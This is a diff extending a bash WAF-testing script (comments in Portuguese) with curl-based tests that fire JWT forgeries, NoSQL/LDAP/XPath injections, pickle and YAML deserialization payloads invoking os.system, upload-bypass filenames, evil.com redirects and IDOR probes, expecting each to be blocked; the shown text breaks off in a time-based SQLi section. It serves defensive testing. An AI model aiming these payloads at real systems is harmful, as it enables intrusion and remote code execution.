@@ -1,12 +1,13 @@
 #!/bin/bash
 #==============================================================================
 # HTTP Header Security Testing Suite - EXPANDED VERSION
-# Versão: 4.2.0
+# Versão: 5.0.0
 # Descrição: Script abrangente para testes de segurança de cabeçalhos HTTP
+#            Inclui 50+ categorias de testes e 800+ payloads de ataque
 #==============================================================================
 
 set -uo pipefail
-VERSION="4.2.0"
+VERSION="5.0.0"
 
 # Cores
 RED='\033[0;31m'
@@ -3369,6 +3370,386 @@ test_403_bypass() {
     echo -e "  ${YELLOW}• Nginx Config:${NC} Use 'merge_slashes on;' e normalize URIs"
     echo -e "  ${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
 }
+test_jwt_attacks() {
+    print_section "🔐 TESTES DE JWT SECURITY (30 testes)" "-c jwt"
+    
+    print_subsection "JWT 'none' Algorithm Attack"
+    # JWT com alg: none (header: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0)
+    test_curl "JWT: alg=none" "block" -A "$UA" -Lk -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ." "$URL"
+    test_curl "JWT: alg=None" "block" -A "$UA" -Lk -H "Authorization: Bearer eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ." "$URL"
+    test_curl "JWT: alg=NONE" "block" -A "$UA" -Lk -H "Authorization: Bearer eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ." "$URL"
+    test_curl "JWT: alg=nOnE" "block" -A "$UA" -Lk -H "Authorization: Bearer eyJhbGciOiJuT25FIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ." "$URL"
+    
+    print_subsection "JWT Algorithm Confusion (RS256 → HS256)"
+    # JWT com HS256 usando public key como secret
+    test_curl "JWT: HS256 forged" "block" -A "$UA" -Lk -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.forged" "$URL"
+    test_curl "JWT: hs256 lowercase" "block" -A "$UA" -Lk -H "Authorization: Bearer eyJhbGciOiJoczI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.test" "$URL"
+    
+    print_subsection "JWT Claim Tampering"
+    test_curl "JWT: role=admin claim" "block" -A "$UA" -Lk -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIiwiaXNBZG1pbiI6dHJ1ZX0.fake" "$URL"
+    test_curl "JWT: isAdmin=true" "block" -A "$UA" -Lk -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc0FkbWluIjp0cnVlLCJ1c2VyIjoiYXR0YWNrZXIifQ.fake" "$URL"
+    test_curl "JWT: exp in future (2099)" "block" -A "$UA" -Lk -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwiZXhwIjo0MDcwOTA4ODAwfQ.fake" "$URL"
+    test_curl "JWT: negative exp" "block" -A "$UA" -Lk -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwiZXhwIjotMX0.fake" "$URL"
+    
+    print_subsection "JWT Header Injection"
+    test_curl "JWT: kid injection" "block" -A "$UA" -Lk -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii4uLy4uLy4uL2V0Yy9wYXNzd2QifQ.eyJzdWIiOiIxIn0.fake" "$URL"
+    test_curl "JWT: jku injection" "block" -A "$UA" -Lk -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImprdSI6Imh0dHA6Ly9ldmlsLmNvbS9qd2tzLmpzb24ifQ.eyJzdWIiOiIxIn0.fake" "$URL"
+    test_curl "JWT: x5u injection" "block" -A "$UA" -Lk -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsIng1dSI6Imh0dHA6Ly9ldmlsLmNvbS9jZXJ0LnBlbSJ9.eyJzdWIiOiIxIn0.fake" "$URL"
+    test_curl "JWT: kid SQLi" "block" -A "$UA" -Lk -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IicgT1IgJzEnPScxIn0.eyJzdWIiOiIxIn0.fake" "$URL"
+    
+    print_subsection "JWT Weak Secret Patterns"
+    test_curl "JWT: common secret 'secret'" "block" -A "$UA" -Lk -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.XbPfbIHMI6arZ3Y922BhjWgQzWXcXNrz0ogtVhfEd2o" "$URL"
+    test_curl "JWT: empty signature" "block" -A "$UA" -Lk -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImFkbWluIn0." "$URL"
+    
+    print_subsection "JWT em Diferentes Locais"
+    test_curl "JWT: Cookie auth" "block" -A "$UA" -Lk --cookie "token=eyJhbGciOiJub25lIn0.eyJhZG1pbiI6dHJ1ZX0." "$URL"
+    test_curl "JWT: X-Access-Token" "block" -A "$UA" -Lk -H "X-Access-Token: eyJhbGciOiJub25lIn0.eyJhZG1pbiI6dHJ1ZX0." "$URL"
+    test_curl "JWT: Query param" "block" -A "$UA" -Lk "${URL}?token=eyJhbGciOiJub25lIn0.eyJhZG1pbiI6dHJ1ZX0."
+    test_curl "JWT: POST body" "block" -A "$UA" -Lk -X POST -d "token=eyJhbGciOiJub25lIn0.eyJhZG1pbiI6dHJ1ZX0." "$URL"
+}
+
+#==============================================================================
+# NOSQL INJECTION TESTS
+#==============================================================================
+test_nosql_injection() {
+    print_section "🍃 TESTES DE NOSQL INJECTION (30 testes)" "-c nosql"
+    
+    print_subsection "MongoDB Injection - Query Operators"
+    test_curl "NoSQL: \$ne operator" "block" -A "$UA" -Lk "${URL}?username[\$ne]=invalid&password[\$ne]=invalid"
+    test_curl "NoSQL: \$gt operator" "block" -A "$UA" -Lk "${URL}?username[\$gt]=&password[\$gt]="
+    test_curl "NoSQL: \$gte operator" "block" -A "$UA" -Lk "${URL}?id[\$gte]=0"
+    test_curl "NoSQL: \$lt operator" "block" -A "$UA" -Lk "${URL}?id[\$lt]=9999999"
+    test_curl "NoSQL: \$in operator" "block" -A "$UA" -Lk "${URL}?role[\$in][]=admin&role[\$in][]=root"
+    test_curl "NoSQL: \$nin operator" "block" -A "$UA" -Lk "${URL}?role[\$nin][]=guest"
+    test_curl "NoSQL: \$regex operator" "block" -A "$UA" -Lk "${URL}?username[\$regex]=.*&password[\$regex]=.*"
+    test_curl "NoSQL: \$exists operator" "block" -A "$UA" -Lk "${URL}?username[\$exists]=true"
+    test_curl "NoSQL: \$or operator" "block" -A "$UA" -Lk "${URL}?\$or[0][username]=admin&\$or[1][username]=root"
+    test_curl "NoSQL: \$and operator" "block" -A "$UA" -Lk "${URL}?\$and[0][role]=admin"
+    
+    print_subsection "MongoDB Injection - JSON Body"
+    test_curl "NoSQL: JSON \$ne" "block" -A "$UA" -Lk -X POST -H "Content-Type: application/json" -d '{"username":{"$ne":""},"password":{"$ne":""}}' "$URL"
+    test_curl "NoSQL: JSON \$gt" "block" -A "$UA" -Lk -X POST -H "Content-Type: application/json" -d '{"username":{"$gt":""},"password":{"$gt":""}}' "$URL"
+    test_curl "NoSQL: JSON \$regex" "block" -A "$UA" -Lk -X POST -H "Content-Type: application/json" -d '{"username":{"$regex":".*"},"password":{"$regex":".*"}}' "$URL"
+    test_curl "NoSQL: JSON \$where" "block" -A "$UA" -Lk -X POST -H "Content-Type: application/json" -d '{"$where":"this.password.length>0"}' "$URL"
+    test_curl "NoSQL: JSON \$or bypass" "block" -A "$UA" -Lk -X POST -H "Content-Type: application/json" -d '{"$or":[{"username":"admin"},{"username":{"$ne":""}}]}' "$URL"
+    
+    print_subsection "MongoDB JavaScript Injection"
+    test_curl "NoSQL: \$where JS" "block" -A "$UA" -Lk "${URL}?\$where=function(){return true;}"
+    test_curl "NoSQL: \$where sleep" "block" -A "$UA" -Lk "${URL}?\$where=sleep(5000)"
+    test_curl "NoSQL: mapReduce" "block" -A "$UA" -Lk -X POST -H "Content-Type: application/json" -d '{"mapReduce":"users","map":"function(){emit(1,this)}","reduce":"function(k,v){return v}"}' "$URL"
+    
+    print_subsection "CouchDB Injection"
+    test_curl "NoSQL: CouchDB _all_docs" "block" -A "$UA" -Lk "${URL}/_all_docs"
+    test_curl "NoSQL: CouchDB _users" "block" -A "$UA" -Lk "${URL}/_users/_all_docs"
+    test_curl "NoSQL: CouchDB _config" "block" -A "$UA" -Lk "${URL}/_config"
+    
+    print_subsection "Redis Injection"
+    test_curl "NoSQL: Redis EVAL" "block" -A "$UA" -Lk "${URL}?key=test%0d%0aEVAL%20return%201"
+    test_curl "NoSQL: Redis CONFIG" "block" -A "$UA" -Lk "${URL}?key=test%0d%0aCONFIG%20GET%20*"
+    test_curl "NoSQL: Redis KEYS" "block" -A "$UA" -Lk "${URL}?key=test%0d%0aKEYS%20*"
+    
+    print_subsection "Encoded NoSQL Payloads"
+    test_curl "NoSQL: URL encoded \$ne" "block" -A "$UA" -Lk "${URL}?username%5B%24ne%5D=x"
+    test_curl "NoSQL: Double encoded" "block" -A "$UA" -Lk "${URL}?username%255B%2524ne%255D=x"
+    test_curl "NoSQL: Unicode \$" "block" -A "$UA" -Lk "${URL}?username[\\u0024ne]=x"
+}
+
+#==============================================================================
+# LDAP INJECTION TESTS
+#==============================================================================
+test_ldap_injection() {
+    print_section "📁 TESTES DE LDAP INJECTION (20 testes)" "-c ldap"
+    
+    print_subsection "LDAP Filter Injection"
+    test_curl "LDAP: )(uid=*))(|(uid=*" "block" -A "$UA" -Lk "${URL}?user=)(uid=*))(|(uid=*"
+    test_curl "LDAP: *)(uid=*))(|(uid=*" "block" -A "$UA" -Lk "${URL}?user=*)(uid=*))(|(uid=*"
+    test_curl "LDAP: admin)(&)" "block" -A "$UA" -Lk "${URL}?user=admin)(%26)"
+    test_curl "LDAP: admin)(|(password=*))" "block" -A "$UA" -Lk "${URL}?user=admin)(|(password=*))"
+    test_curl "LDAP: *)(objectClass=*" "block" -A "$UA" -Lk "${URL}?user=*)(objectClass=*"
+    test_curl "LDAP: *)(&(objectClass=person)" "block" -A "$UA" -Lk "${URL}?user=*)(%26(objectClass=person)"
+    
+    print_subsection "LDAP Attribute Extraction"
+    test_curl "LDAP: userPassword extraction" "block" -A "$UA" -Lk "${URL}?attr=*)(userPassword=*"
+    test_curl "LDAP: mail extraction" "block" -A "$UA" -Lk "${URL}?attr=*)(mail=*"
+    test_curl "LDAP: cn enumeration" "block" -A "$UA" -Lk "${URL}?search=*)(cn=admin*"
+    test_curl "LDAP: objectClass dump" "block" -A "$UA" -Lk "${URL}?filter=(objectClass=*)"
+    
+    print_subsection "LDAP Blind Injection"
+    test_curl "LDAP: Blind true" "block" -A "$UA" -Lk "${URL}?user=admin)(|(cn=*"
+    test_curl "LDAP: Blind false" "block" -A "$UA" -Lk "${URL}?user=admin)(|(cn=XXXNOTEXISTSXXX"
+    test_curl "LDAP: Wildcard enum" "block" -A "$UA" -Lk "${URL}?user=a*"
+    test_curl "LDAP: Char bruteforce" "block" -A "$UA" -Lk "${URL}?password=p*"
+    
+    print_subsection "LDAP Encoded Payloads"
+    test_curl "LDAP: URL encoded" "block" -A "$UA" -Lk "${URL}?user=%29%28uid%3D%2A%29%29%28%7C%28uid%3D%2A"
+    test_curl "LDAP: Null byte" "block" -A "$UA" -Lk "${URL}?user=admin%00"
+    test_curl "LDAP: Unicode null" "block" -A "$UA" -Lk "${URL}?user=admin\u0000"
+    test_curl "LDAP: Hex encoding" "block" -A "$UA" -Lk "${URL}?user=\\28uid=*\\29"
+}
+
+#==============================================================================
+# XPATH INJECTION TESTS
+#==============================================================================
+test_xpath_injection() {
+    print_section "🔍 TESTES DE XPATH INJECTION (20 testes)" "-c xpath"
+    
+    print_subsection "XPath Basic Injection"
+    test_curl "XPath: ' or '1'='1" "block" -A "$UA" -Lk "${URL}?name=' or '1'='1"
+    test_curl "XPath: ' or 1=1 or ''" "block" -A "$UA" -Lk "${URL}?name=' or 1=1 or ''"
+    test_curl "XPath: \" or \"\"=\"" "block" -A "$UA" -Lk "${URL}?name=\" or \"\"=\""
+    test_curl "XPath: admin' or '1'='1'--" "block" -A "$UA" -Lk "${URL}?user=admin' or '1'='1'--"
+    test_curl "XPath: '] | //user/*['" "block" -A "$UA" -Lk "${URL}?name='] | //user/*['"
+    
+    print_subsection "XPath Node Extraction"
+    test_curl "XPath: //*" "block" -A "$UA" -Lk "${URL}?query=//*"
+    test_curl "XPath: //user" "block" -A "$UA" -Lk "${URL}?query=//user"
+    test_curl "XPath: //password" "block" -A "$UA" -Lk "${URL}?query=//password"
+    test_curl "XPath: //@*" "block" -A "$UA" -Lk "${URL}?query=//@*"
+    test_curl "XPath: count(//*)" "block" -A "$UA" -Lk "${URL}?query=count(//*)"
+    
+    print_subsection "XPath Blind Injection"
+    test_curl "XPath: substring()" "block" -A "$UA" -Lk "${URL}?name=' or substring(//user/password,1,1)='a"
+    test_curl "XPath: string-length()" "block" -A "$UA" -Lk "${URL}?name=' or string-length(//user/password)>0 or '1'='2"
+    test_curl "XPath: contains()" "block" -A "$UA" -Lk "${URL}?name=' or contains(//user/name,'admin') or '1'='2"
+    test_curl "XPath: starts-with()" "block" -A "$UA" -Lk "${URL}?name=' or starts-with(//user/name,'a') or '1'='2"
+    
+    print_subsection "XPath OOB/Error Based"
+    test_curl "XPath: doc() function" "block" -A "$UA" -Lk "${URL}?query=doc('http://evil.com/xxe')"
+    test_curl "XPath: document()" "block" -A "$UA" -Lk "${URL}?query=document('http://evil.com')"
+    test_curl "XPath: error based" "block" -A "$UA" -Lk "${URL}?name=' and 1=0 union select password from users--"
+    test_curl "XPath: namespace-uri()" "block" -A "$UA" -Lk "${URL}?query=namespace-uri(//*)"
+}
+
+#==============================================================================
+# DESERIALIZATION ATTACKS
+#==============================================================================
+test_deserialization() {
+    print_section "📦 TESTES DE INSECURE DESERIALIZATION (30 testes)" "-c deser"
+    
+    print_subsection "PHP Unserialize"
+    test_curl "PHP Deser: O:object" "block" -A "$UA" -Lk "${URL}?data=O:8:\"stdClass\":0:{}"
+    test_curl "PHP Deser: __wakeup" "block" -A "$UA" -Lk "${URL}?data=O:4:\"Test\":1:{s:4:\"file\";s:11:\"/etc/passwd\";}"
+    test_curl "PHP Deser: __destruct" "block" -A "$UA" -Lk "${URL}?data=O:7:\"Exploit\":1:{s:3:\"cmd\";s:2:\"id\";}"
+    test_curl "PHP Deser: Guzzle chain" "block" -A "$UA" -Lk "${URL}?data=O:31:\"GuzzleHttp\\\\Cookie\\\\FileCookieJar\":0:{}"
+    test_curl "PHP Deser: Monolog" "block" -A "$UA" -Lk "${URL}?data=O:32:\"Monolog\\\\Handler\\\\SyslogUdpHandler\":0:{}"
+    test_curl "PHP Deser: Base64" "block" -A "$UA" -Lk "${URL}?data=Tzo4OiJzdGRDbGFzcyI6MDp7fQ=="
+    
+    print_subsection "Java Deserialization"
+    # Common Java gadget chain indicators (base64 encoded patterns)
+    test_curl "Java Deser: aced0005" "block" -A "$UA" -Lk -X POST -H "Content-Type: application/octet-stream" -d $'\xac\xed\x00\x05' "$URL"
+    test_curl "Java Deser: rO0AB" "block" -A "$UA" -Lk "${URL}?data=rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA=="
+    test_curl "Java Deser: commons-collections" "block" -A "$UA" -Lk -H "Cookie: JSESSIONID=rO0ABXNyADJvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWU=" "$URL"
+    test_curl "Java Deser: Spring" "block" -A "$UA" -Lk -H "X-Data: rO0ABXNyAC5vcmcuc3ByaW5nZnJhbWV3b3JrLmNvcmUuaW8=" "$URL"
+    
+    print_subsection "Python Pickle"
+    test_curl "Pickle: cos\\nsystem" "block" -A "$UA" -Lk "${URL}?data=Y29zCnN5c3RlbQooUydpZCcKdFIu"
+    test_curl "Pickle: __reduce__" "block" -A "$UA" -Lk "${URL}?data=gASVMQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAJpZJSFlFKULg=="
+    test_curl "Pickle: exec payload" "block" -A "$UA" -Lk -X POST -d "pickle=gASVJAAAAAAAAACMCGJ1aWx0aW5zlIwEZXhlY5STlIwJcHJpbnQoMSmUhZRSlC4=" "$URL"
+    
+    print_subsection "Ruby Marshal"
+    test_curl "Ruby: Marshal.load" "block" -A "$UA" -Lk "${URL}?data=BAhvOglVc2VyBjoJbmFtZUkiCmFkbWlu"
+    test_curl "Ruby: ERB template" "block" -A "$UA" -Lk "${URL}?data=BAhvOi1BY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbg=="
+    
+    print_subsection ".NET Deserialization"
+    test_curl ".NET: ViewState" "block" -A "$UA" -Lk -X POST -d "__VIEWSTATE=/wEPDwUJODExMDE5Nzk3D2QWAgIDD2QWAgIBDw8WAh4EVGV4dA==" "$URL"
+    test_curl ".NET: ObjectStateFormatter" "block" -A "$UA" -Lk "${URL}?data=/wEy..."
+    test_curl ".NET: LosFormatter" "block" -A "$UA" -Lk "${URL}?state=/wEPDQUJMTE5MDg5..."
+    test_curl ".NET: BinaryFormatter" "block" -A "$UA" -Lk -H "X-Data: AAEAAAD/////AQAAAA==" "$URL"
+    
+    print_subsection "YAML Deserialization"
+    test_curl "YAML: !!python/object" "block" -A "$UA" -Lk -X POST -H "Content-Type: application/x-yaml" -d "!!python/object/apply:os.system [id]" "$URL"
+    test_curl "YAML: !ruby/object" "block" -A "$UA" -Lk -X POST -H "Content-Type: application/x-yaml" -d "--- !ruby/object:Gem::Installer" "$URL"
+    test_curl "YAML: !<tag:" "block" -A "$UA" -Lk "${URL}?yaml=!!python/object/new:os.system [id]"
+}
+
+#==============================================================================
+# FILE UPLOAD SECURITY TESTS
+#==============================================================================
+test_file_upload() {
+    print_section "📤 TESTES DE FILE UPLOAD SECURITY (30 testes)" "-c upload"
+    
+    print_subsection "Extension Bypass"
+    test_curl "Upload: .php" "block" -A "$UA" -Lk -X POST -F "file=@/dev/null;filename=shell.php" "$URL"
+    test_curl "Upload: .php5" "block" -A "$UA" -Lk -X POST -F "file=@/dev/null;filename=shell.php5" "$URL"
+    test_curl "Upload: .phtml" "block" -A "$UA" -Lk -X POST -F "file=@/dev/null;filename=shell.phtml" "$URL"
+    test_curl "Upload: .phar" "block" -A "$UA" -Lk -X POST -F "file=@/dev/null;filename=shell.phar" "$URL"
+    test_curl "Upload: Double ext .php.jpg" "block" -A "$UA" -Lk -X POST -F "file=@/dev/null;filename=shell.php.jpg" "$URL"
+    test_curl "Upload: Double ext .jpg.php" "block" -A "$UA" -Lk -X POST -F "file=@/dev/null;filename=shell.jpg.php" "$URL"
+    test_curl "Upload: Null byte .php%00.jpg" "block" -A "$UA" -Lk -X POST -F "file=@/dev/null;filename=shell.php%00.jpg" "$URL"
+    test_curl "Upload: .htaccess" "block" -A "$UA" -Lk -X POST -F "file=@/dev/null;filename=.htaccess" "$URL"
+    test_curl "Upload: .user.ini" "block" -A "$UA" -Lk -X POST -F "file=@/dev/null;filename=.user.ini" "$URL"
+    test_curl "Upload: web.config" "block" -A "$UA" -Lk -X POST -F "file=@/dev/null;filename=web.config" "$URL"
+    
+    print_subsection "MIME Type Spoofing"
+    test_curl "Upload: MIME image/jpeg" "block" -A "$UA" -Lk -X POST -F "file=@/dev/null;filename=shell.php;type=image/jpeg" "$URL"
+    test_curl "Upload: MIME image/png" "block" -A "$UA" -Lk -X POST -F "file=@/dev/null;filename=shell.php;type=image/png" "$URL"
+    test_curl "Upload: MIME image/gif" "block" -A "$UA" -Lk -X POST -F "file=@/dev/null;filename=shell.php;type=image/gif" "$URL"
+    test_curl "Upload: MIME text/plain" "block" -A "$UA" -Lk -X POST -F "file=@/dev/null;filename=shell.php;type=text/plain" "$URL"
+    
+    print_subsection "Server-Side Extensions"
+    test_curl "Upload: .asp" "block" -A "$UA" -Lk -X POST -F "file=@/dev/null;filename=shell.asp" "$URL"
+    test_curl "Upload: .aspx" "block" -A "$UA" -Lk -X POST -F "file=@/dev/null;filename=shell.aspx" "$URL"
+    test_curl "Upload: .jsp" "block" -A "$UA" -Lk -X POST -F "file=@/dev/null;filename=shell.jsp" "$URL"
+    test_curl "Upload: .jspx" "block" -A "$UA" -Lk -X POST -F "file=@/dev/null;filename=shell.jspx" "$URL"
+    test_curl "Upload: .cgi" "block" -A "$UA" -Lk -X POST -F "file=@/dev/null;filename=shell.cgi" "$URL"
+    test_curl "Upload: .pl" "block" -A "$UA" -Lk -X POST -F "file=@/dev/null;filename=shell.pl" "$URL"
+    
+    print_subsection "Case Sensitivity Bypass"
+    test_curl "Upload: .PHP" "block" -A "$UA" -Lk -X POST -F "file=@/dev/null;filename=shell.PHP" "$URL"
+    test_curl "Upload: .pHp" "block" -A "$UA" -Lk -X POST -F "file=@/dev/null;filename=shell.pHp" "$URL"
+    test_curl "Upload: .PhP" "block" -A "$UA" -Lk -X POST -F "file=@/dev/null;filename=shell.PhP" "$URL"
+    
+    print_subsection "Path Traversal in Filename"
+    test_curl "Upload: ../shell.php" "block" -A "$UA" -Lk -X POST -F "file=@/dev/null;filename=../shell.php" "$URL"
+    test_curl "Upload: ../../shell.php" "block" -A "$UA" -Lk -X POST -F "file=@/dev/null;filename=../../shell.php" "$URL"
+    test_curl "Upload: ..%2fshell.php" "block" -A "$UA" -Lk -X POST -F "file=@/dev/null;filename=..%2fshell.php" "$URL"
+    test_curl "Upload: ..\\shell.php" "block" -A "$UA" -Lk -X POST -F "file=@/dev/null;filename=..\\shell.php" "$URL"
+}
+
+#==============================================================================
+# OPEN REDIRECT TESTS
+#==============================================================================
+test_open_redirect() {
+    print_section "↗️ TESTES DE OPEN REDIRECT (25 testes)" "-c redirect"
+    
+    print_subsection "Basic Redirect"
+    test_curl "Redirect: url=evil.com" "block" -A "$UA" -Lk "${URL}?url=http://evil.com"
+    test_curl "Redirect: next=evil.com" "block" -A "$UA" -Lk "${URL}?next=http://evil.com"
+    test_curl "Redirect: redirect=evil.com" "block" -A "$UA" -Lk "${URL}?redirect=http://evil.com"
+    test_curl "Redirect: return=evil.com" "block" -A "$UA" -Lk "${URL}?return=http://evil.com"
+    test_curl "Redirect: returnUrl=evil.com" "block" -A "$UA" -Lk "${URL}?returnUrl=http://evil.com"
+    test_curl "Redirect: goto=evil.com" "block" -A "$UA" -Lk "${URL}?goto=http://evil.com"
+    test_curl "Redirect: destination=evil.com" "block" -A "$UA" -Lk "${URL}?destination=http://evil.com"
+    test_curl "Redirect: continue=evil.com" "block" -A "$UA" -Lk "${URL}?continue=http://evil.com"
+    
+    print_subsection "Protocol-less Redirect"
+    test_curl "Redirect: //evil.com" "block" -A "$UA" -Lk "${URL}?url=//evil.com"
+    test_curl "Redirect: ///evil.com" "block" -A "$UA" -Lk "${URL}?url=///evil.com"
+    test_curl "Redirect: \\\\evil.com" "block" -A "$UA" -Lk "${URL}?url=\\\\evil.com"
+    test_curl "Redirect: \\/evil.com" "block" -A "$UA" -Lk "${URL}?url=\\/evil.com"
+    
+    print_subsection "Encoded Redirect"
+    test_curl "Redirect: URL encoded" "block" -A "$UA" -Lk "${URL}?url=%68%74%74%70%3a%2f%2f%65%76%69%6c%2e%63%6f%6d"
+    test_curl "Redirect: Double encoded" "block" -A "$UA" -Lk "${URL}?url=%252f%252fevil.com"
+    test_curl "Redirect: Unicode" "block" -A "$UA" -Lk "${URL}?url=https://evil。com"
+    
+    print_subsection "Bypass Techniques"
+    test_curl "Redirect: @evil.com" "block" -A "$UA" -Lk "${URL}?url=http://target.com@evil.com"
+    test_curl "Redirect: target.com.evil.com" "block" -A "$UA" -Lk "${URL}?url=http://target.com.evil.com"
+    test_curl "Redirect: evil.com/target.com" "block" -A "$UA" -Lk "${URL}?url=http://evil.com/target.com"
+    test_curl "Redirect: javascript:" "block" -A "$UA" -Lk "${URL}?url=javascript:alert(1)"
+    test_curl "Redirect: data:" "block" -A "$UA" -Lk "${URL}?url=data:text/html,<script>alert(1)</script>"
+    
+    print_subsection "Header-based Redirect"
+    test_curl "Redirect: Host header" "block" -A "$UA" -Lk -H "Host: evil.com" "${URL}/redirect"
+    test_curl "Redirect: X-Forwarded-Host" "block" -A "$UA" -Lk -H "X-Forwarded-Host: evil.com" "${URL}/redirect"
+}
+
+#==============================================================================
+# PRIVILEGE ESCALATION / IDOR TESTS
+#==============================================================================
+test_idor_priv_esc() {
+    print_section "🔑 TESTES DE IDOR / PRIVILEGE ESCALATION (30 testes)" "-c idor"
+    
+    print_subsection "IDOR - Sequential IDs"
+    test_curl "IDOR: user_id=1" "block" -A "$UA" -Lk "${URL}?user_id=1"
+    test_curl "IDOR: user_id=2" "block" -A "$UA" -Lk "${URL}?user_id=2"
+    test_curl "IDOR: id=0" "block" -A "$UA" -Lk "${URL}?id=0"
+    test_curl "IDOR: account_id=admin" "block" -A "$UA" -Lk "${URL}?account_id=admin"
+    test_curl "IDOR: /users/1" "block" -A "$UA" -Lk "${URL}/users/1"
+    test_curl "IDOR: /users/1/edit" "block" -A "$UA" -Lk "${URL}/users/1/edit"
+    test_curl "IDOR: /api/users/1" "block" -A "$UA" -Lk "${URL}/api/users/1"
+    test_curl "IDOR: /profile/1" "block" -A "$UA" -Lk "${URL}/profile/1"
+    
+    print_subsection "Parameter Tampering"
+    test_curl "Priv Esc: role=admin" "block" -A "$UA" -Lk -X POST -d "role=admin" "$URL"
+    test_curl "Priv Esc: isAdmin=true" "block" -A "$UA" -Lk -X POST -d "isAdmin=true" "$URL"
+    test_curl "Priv Esc: is_admin=1" "block" -A "$UA" -Lk -X POST -d "is_admin=1" "$URL"
+    test_curl "Priv Esc: admin=1" "block" -A "$UA" -Lk -X POST -d "admin=1" "$URL"
+    test_curl "Priv Esc: access_level=admin" "block" -A "$UA" -Lk -X POST -d "access_level=admin" "$URL"
+    test_curl "Priv Esc: user_role=administrator" "block" -A "$UA" -Lk -X POST -d "user_role=administrator" "$URL"
+    
+    print_subsection "Mass Assignment"
+    test_curl "Mass Assign: JSON role" "block" -A "$UA" -Lk -X POST -H "Content-Type: application/json" -d '{"name":"test","role":"admin"}' "$URL"
+    test_curl "Mass Assign: JSON isAdmin" "block" -A "$UA" -Lk -X POST -H "Content-Type: application/json" -d '{"username":"test","isAdmin":true}' "$URL"
+    test_curl "Mass Assign: user[admin]" "block" -A "$UA" -Lk -X POST -d "user[name]=test&user[admin]=1" "$URL"
+    test_curl "Mass Assign: Array role" "block" -A "$UA" -Lk -X POST -d "data[role]=admin&data[name]=test" "$URL"
+    
+    print_subsection "GraphQL Authorization Bypass"
+    test_curl "GraphQL: users query" "block" -A "$UA" -Lk -X POST -H "Content-Type: application/json" -d '{"query":"{ users { id email password } }"}' "${URL}/graphql"
+    test_curl "GraphQL: admin mutation" "block" -A "$UA" -Lk -X POST -H "Content-Type: application/json" -d '{"query":"mutation { updateUser(id:1,role:\"admin\") { id } }"}' "${URL}/graphql"
+    test_curl "GraphQL: __schema" "block" -A "$UA" -Lk -X POST -H "Content-Type: application/json" -d '{"query":"{ __schema { types { name fields { name } } } }"}' "${URL}/graphql"
+    test_curl "GraphQL: introspection" "block" -A "$UA" -Lk -X POST -H "Content-Type: application/json" -d '{"query":"{ __type(name:\"User\") { fields { name type { name } } } }"}' "${URL}/graphql"
+    
+    print_subsection "HTTP Method Override"
+    test_curl "Method: X-HTTP-Method-Override DELETE" "block" -A "$UA" -Lk -X POST -H "X-HTTP-Method-Override: DELETE" "$URL"
+    test_curl "Method: X-HTTP-Method PUT" "block" -A "$UA" -Lk -X POST -H "X-HTTP-Method: PUT" "$URL"
+    test_curl "Method: X-Method-Override PATCH" "block" -A "$UA" -Lk -X POST -H "X-Method-Override: PATCH" "$URL"
+    test_curl "Method: _method=DELETE" "block" -A "$UA" -Lk -X POST -d "_method=DELETE" "$URL"
+}
+
+#==============================================================================
+# TIME-BASED BLIND INJECTION TESTS
+#==============================================================================
+test_time_based_injection() {
+    print_section "⏱️ TESTES DE TIME-BASED BLIND INJECTION (20 testes)" "-c timebased"
+    
+    echo -e "  ${YELLOW}ℹ️  Testando payloads que podem causar delays - WAF deve bloquear${NC}"
+    echo ""
+    
+    print_subsection "SQL Time-based Blind"
+    test_curl "SQLi Time: SLEEP(5)" "block" -A "$UA" -Lk "${URL}?id=1' AND SLEEP(5)--"
